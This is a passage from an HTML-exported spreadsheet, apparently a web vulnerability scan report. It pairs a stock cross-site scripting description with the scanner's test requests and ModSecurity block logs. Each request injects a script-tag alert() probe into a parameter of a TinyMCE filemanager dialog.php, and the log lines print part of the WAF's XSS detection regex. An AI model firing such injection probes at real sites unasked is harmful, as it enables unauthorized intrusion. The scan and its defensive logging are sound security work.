</td><td class=xl24 width=64 >2015-04-01 09:27:24</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:23 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(275799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtso6wQAW0AAD9hYNoAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtso6wQAW0AAD9hYNoAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366794</td><td class=xl24 width=64 >2015-03-31 19:39:30</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(456099)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=82s7cb4ceekgnlufrh8bib84a7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:25</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:24 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(456099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtspKwQAW0AAHewA84AAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtspKwQAW0AAHewA84AAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366795</td><td class=xl24 width=64 >2015-03-31 19:40:28</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(452499)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=ppcdrtu1mvpcvc6a0bi6tbssg6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:26</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:25 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(452499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtspawQAW0AABvT@GoAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtspawQAW0AABvT@GoAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366796</td><td class=xl24 width=64 >2015-03-31 19:41:15</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(776199)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=jjnleb681ulcud6q8sp5ku6tr0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:28</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:26 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(776199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtspqwQAW0AAHhB77IAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtspqwQAW0AAHhB77IAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366797</td><td class=xl24 width=64 >2015-03-31 19:42:59</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(492399)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=q1ivakmgtbs55adbhuf7qac7d0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:29</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:28 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(492399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsqKwQAW0AABt@bVkAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsqKwQAW0AABt@bVkAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366798</td><td class=xl24 width=64 >2015-03-31 19:43:53</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr='&gt;&lt;script&gt;alert(864099)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%27%3Ealert%28864099%29%2F; PHPSESSID=g12en54sv8feg35q92a2gs0la6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:30</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:29 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(864099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsqawQAW0AAHchlVEAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsqawQAW0AAHchlVEAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366799</td><td class=xl24 width=64 >2015-03-31 19:44:29</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(154099)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=jmtmhvb94ci2os0otpf1sp0ik5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:31</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:30 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(154099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsqqwQAW0AAHgzv0MAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsqqwQAW0AAHgzv0MAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366800</td><td class=xl24 width=64 >2015-03-31 19:44:44</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(786499)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=5phve0b3v7orvhoniahdbpoch0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:33</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:32 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(786499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsrKwQAW0AAB7zKNAAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsrKwQAW0AAB7zKNAAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366801</td><td class=xl24 width=64 >2015-03-31 19:46:29</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
